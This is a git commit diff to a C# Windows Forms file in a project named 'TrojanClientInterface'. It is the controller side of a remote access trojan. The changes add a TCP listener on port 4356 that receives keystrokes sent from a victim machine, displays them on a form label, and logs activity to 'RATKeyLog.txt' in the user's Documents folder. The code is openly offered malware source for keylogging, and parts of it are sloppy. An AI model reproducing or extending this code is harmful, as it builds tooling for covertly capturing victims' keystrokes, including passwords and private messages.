a17ef4a3db77ed820a69491aea5e202f6ab6b856
RobStyling <moelrobi@gmail.com>
2016-11-13 02:02:10 +0100

    Github bugg.. added to last Commit.

--- TrojanClientInterface/Form2.cs
+++ TrojanClientInterface/Form2.cs
@@ -4,36 +4,36 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Threading;
 
 namespace Tro_Client
 {
-	public partial class Form2 : Form
-	{
-		public static NetworkStream Reciver;
-		public Form2()
-		{
-			//
-			// The InitializeComponent() call is required for Windows Forms designer support.
-			//
-			InitializeComponent();
-			
-			//
-			// TODO: Add constructor code after the InitializeComponent() call.
-			//
-				TcpListener l = new TcpListener(2000);
+    public partial class Form2 : Form
+    {
+        public static NetworkStream Reciver;
+        public string GKeys;
+        public Form2()
+        {
+            InitializeComponent();
+        }
+
+        private void Form2_Load(object sender, EventArgs e)
+        {
+                TcpListener l = new TcpListener(4356);
                 l.Start();
-                Log("Started TcpListener..." , "ALWAYS");
+                Log("Started TcpListener...", "ALWAYS");
                 TcpClient Connection = l.AcceptTcpClient();
                 Reciver = Connection.GetStream();
                 System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
-                Log("Started Reciver!" , "ALWAYS");
+                Log("Started Reciver!", "ALWAYS");
                 Rec.Start();
-		}
-		public static void Recive()
+            }
+        public void Recive()
         {
             while (true)
             {
@@ -42,42 +42,50 @@ namespace Tro_Client
                     byte[] RecPacket = new byte[1000];
                     Reciver.Read(RecPacket, 0, RecPacket.Length);
                     Reciver.Flush();
-                    string Command = Encoding.ASCII.GetString(RecPacket);
-                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!!---");
-                    Command = CommandArray[0];
-                    switch(Command)
+                    string Keys = Encoding.ASCII.GetString(RecPacket);
+                    string[] KeysArray = System.Text.RegularExpressions.Regex.Split(Keys, "!!!!---");
+                    Keys = KeysArray[0];
+                    switch (Keys)
                     {
+                        case "Key":
+                            string Key = KeysArray[1];
+                            Key = Key + Key.Trim('\0');
+                            GKeys = Key;
+                            this.label1.Text = this.label1.Text + GKeys;
+                            break;
                     }
                 }
-                catch
+                catch(Exception e)
                 {
+                    Log(Convert.ToString(e), "Exception");
                     break;
 
                 }
             }
         }
-		
-		public static string GetTempPath()
+
+        public static string GetTempPath()
         {
-        	string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-        	if (!path.EndsWith("\\")) path += "\\";
-        	return path;
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            if (!path.EndsWith("\\")) path += "\\";
+            return path;
         }
-        
+
         public static void Log(string msg, string art)
         {
-        	System.IO.StreamWriter sw = System.IO.File.AppendText(
-        		GetTempPath() + "RATLog.txt");
-        	try
-        	{
-        		string logLine = System.String.Format(
-        			"{0:G}: {1}: {2} ", System.DateTime.Now,"|", art, msg);
-        		sw.WriteLine(logLine);
-        	}
-        	finally 
-        	{
-        		sw.Close();
-        	}
+            System.IO.StreamWriter sw = System.IO.File.AppendText(
+                GetTempPath() + "RATKeyLog.txt");
+            try
+            {
+                string logLine = System.String.Format(
+                    "{0:G}: {1}: {2} ", System.DateTime.Now, art, msg);
+                sw.WriteLine(logLine);
+            }
+            finally
+            {
+                sw.Close();
+            }
         }
-	}
-}
+    }
+    }
+
